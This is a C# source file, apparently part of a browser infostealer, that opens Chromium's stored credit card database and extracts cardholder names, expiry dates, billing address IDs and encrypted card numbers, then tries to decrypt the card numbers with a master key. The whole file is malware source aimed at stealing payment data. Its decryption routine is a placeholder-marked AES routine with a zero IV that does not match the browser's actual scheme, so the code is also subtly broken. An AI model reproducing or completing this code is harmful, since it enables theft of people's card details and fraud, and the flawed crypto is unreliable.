using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace CreditCard
{
    public class ChromiumCreditCard
    {
        public List<Card> Cards { get; } = new List<Card>();

        public async Task ParseAsync(byte[] masterKey)
        {
            string creditCardPath = Item.TempChromiumCreditCard;
            try
            {
                if (File.Exists(creditCardPath))
                {
                    using (SQLiteConnection connection = new SQLiteConnection($"Data Source={creditCardPath}"))
                    {
                        await connection.OpenAsync();
                        string sql = "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id, nickname FROM credit_cards";
                        using (SQLiteCommand command = new SQLiteCommand(sql, connection))
                        {
                            using (System.Data.Common.DbDataReader reader = await command.ExecuteReaderAsync())
                            {
                                while (await reader.ReadAsync())
                                {
                                    Card card = new Card
                                    {
                                        GUID = reader.GetString(0),
                                        Name = reader.GetString(1),
                                        ExpirationMonth = reader.GetString(2),
                                        ExpirationYear = reader.GetString(3),
                                        Address = reader.GetString(5),
                                        NickName = reader.GetString(6),
                                    };

                                    byte[] encryptedValue = (byte[])reader["card_number_encrypted"];
                                    string decryptedValue = DecryptValue(masterKey, encryptedValue);
                                    card.CardNumber = decryptedValue;

                                    Cards.Add(card);
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error parsing Chromium credit cards: {ex.Message}");
            }
        }

        private string DecryptValue(byte[] masterKey, byte[] encryptedValue)
        {
            if (encryptedValue == null || encryptedValue.Length == 0)
            {
                return null;
            }

            try
            {
                if (masterKey == null || masterKey.Length == 0)
                {
                    return Encoding.UTF8.GetString(encryptedValue);
                }

                // Replace with your decryption logic using the masterKey
                // For example, you can use the AesManaged class:
                using (Aes aesAlg = Aes.Create())
                {
                    aesAlg.Key = masterKey;
                    aesAlg.IV = new byte[aesAlg.BlockSize / 8];
                    using (MemoryStream msDecrypt = new MemoryStream(encryptedValue))
                    {
                        using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV), CryptoStreamMode.Read))
                        {
                            using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                            {
                                return srDecrypt.ReadToEnd();
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error decrypting value: {ex.Message}");
                return null;
            }
        }
    }

    public class Card
    {
        public string GUID { get; set; }
        public string Name { get; set; }
        public string ExpirationYear { get; set; }
        public string ExpirationMonth { get; set; }
        public string CardNumber { get; set; }
        public string Address { get; set; }
        public string NickName { get; set; }
    }

    public class Item
    {
        public const string TempChromiumCreditCard = "Path to Chromium Credit Card file";
    }
}
